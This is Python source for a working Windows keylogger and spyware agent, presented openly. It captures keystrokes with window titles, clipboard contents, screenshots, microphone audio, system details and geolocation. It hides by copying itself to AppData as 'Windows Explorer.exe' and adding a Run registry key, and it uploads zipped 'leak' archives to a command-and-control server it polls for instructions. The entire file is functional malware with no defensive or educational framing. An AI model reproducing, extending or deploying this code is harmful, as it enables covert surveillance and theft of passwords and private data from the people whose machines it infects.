import pynput.keyboard
import socket
import platform
import threading
import time
from PIL import ImageGrab
import win32gui
from cryptography.fernet import Fernet
import os
import pyperclip
import sounddevice as sd
from scipy.io.wavfile import write
# import cv2  # Commented out - requires C compiler to install
import shutil
import subprocess
import sys
import zipfile
import requests
import psutil

class KeyLogger:
    def __init__(self, time_interval=60, server_ip="http://127.0.0.1:5000"):
        self.log = "KeyLogger Started..."
        self.interval = time_interval
        self.server_ip = server_ip
        self.log_file = "keylog.txt"
        self.encrypted_log_file = "keylog.enc"
        self.key_file = "key.key"
        
        self.load_or_generate_key()
        self.get_system_info()
        self.get_geolocation()
        self.get_active_processes()
        self.become_persistent()

    def load_or_generate_key(self):
        if not os.path.exists(self.key_file):
            self.key = Fernet.generate_key()
            with open(self.key_file, "wb") as kf:
                kf.write(self.key)
        else:
            with open(self.key_file, "rb") as kf:
                self.key = kf.read()
        self.cipher = Fernet(self.key)

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def append_to_log(self, string):
        self.log = self.log + string
        self.save_log_encrypted()

    def get_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        
        info = f"\n[+] System Info:\nHostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.append_to_log(info)

    def get_geolocation(self):
        try:
            response = requests.get("http://ip-api.com/json/")
            data = response.json()
            if data['status'] == 'success':
                geo_info = f"\n[+] Geolocation:\nIP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nISP: {data['isp']}\nLat/Lon: {data['lat']}, {data['lon']}\n"
                self.append_to_log(geo_info)
        except Exception as e:
            self.append_to_log(f"\n[-] Geolocation failed: {e}")

    def get_active_processes(self):
        try:
            process_list = []
            for proc in psutil.process_iter(['pid', 'name']):
                process_list.append(f"{proc.info['name']} ({proc.info['pid']})")
            
            processes = ", ".join(process_list)
            self.append_to_log(f"\n[+] Active Processes (Startup):\n{processes}\n")
        except Exception as e:
            self.append_to_log(f"\n[-] Process Monitor failed: {e}")

    def get_active_window(self):
        try:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            return title
        except Exception:
            return "Unknown Window"

    def process_clipboard(self):
        last_clipboard = ""
        while True:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != last_clipboard:
                    self.append_to_log(f"\n[Clipboard]: {current_clipboard}")
                    last_clipboard = current_clipboard
            except Exception:
                pass
            time.sleep(5)

    def record_microphone(self):
        fs = 44100
        seconds = 10
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"audio_{timestamp}.wav"
        
        try:
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(filename, fs, myrecording)
            return filename
        except Exception:
            return None

    def take_webcam_picture(self):
        # Webcam feature disabled - opencv-python requires C compiler
        print("[-] Webcam feature not available (opencv not installed)")
        return None

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        window_title = self.get_active_window()
        self.append_to_log(f"\n[Window: {window_title}] {current_key}")

    def save_log_encrypted(self):
        if self.log:
            try:
                encrypted_data = self.cipher.encrypt(self.log.encode())
                with open(self.encrypted_log_file, "wb") as f:
                    f.write(encrypted_data)
            except Exception as e:
                print(f"Error saving log: {e}")

    def screenshot(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            return filename
        except Exception:
            return None

    def check_for_command(self):
        try:
            print("[*] Checking for commands...")
            # Ideally add a timeout
            response = requests.get(f"{self.server_ip}/command", timeout=5)
            if response.status_code == 200:
                data = response.json()
                command = data.get("command")
                print(f"[+] Received command: {command}")
                
                if command == "screenshot":
                    print("[+] Taking screenshot...")
                    filename = self.screenshot()
                    if filename: self.upload_data(filename)
                
                elif command == "webcam":
                    print("[+] Taking webcam pic...")
                    filename = self.take_webcam_picture()
                    if filename: self.upload_data(filename)
                
                elif command == "audio":
                    print("[+] Recording audio...")
                    filename = self.record_microphone()
                    if filename: self.upload_data(filename)

        except Exception as e:
            print(f"[-] Command Check Failed: {e}")

    def upload_data(self, specific_file=None):
        files_to_send = []
        
        if specific_file:
            files_to_send.append(specific_file)
        else:
            files_to_send.append(self.encrypted_log_file)

        zip_filename = f"leak_{time.strftime('%Y%m%d-%H%M%S')}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in files_to_send:
                if file and os.path.exists(file):
                    zipf.write(file)
        
        if os.path.exists(zip_filename):
            print(f"[*] Uploading {zip_filename} to C2...")
            try:
                with open(zip_filename, "rb") as f:
                    files = {'document': f}
                    requests.post(f"{self.server_ip}/upload", files=files, timeout=30)
                print("[+] Upload Successful.")
            except Exception as e:
                print(f"[-] Upload Failed: {e}")
            
            try:
                os.remove(zip_filename)
                if specific_file and specific_file != self.encrypted_log_file:
                    os.remove(specific_file)
            except:
                pass

        if not specific_file:
            self.log = ""

    def report(self):
        self.check_for_command()
        self.upload_data() 
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        
        t_clipboard = threading.Thread(target=self.process_clipboard)
        t_clipboard.daemon = True
        t_clipboard.start()
        
        self.report()
        
        with keyboard_listener:
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(time_interval=60, server_ip="http://127.0.0.1:5000")
    print("KeyLogger Agent Started. Connecting to C2...")
    keylogger.start()
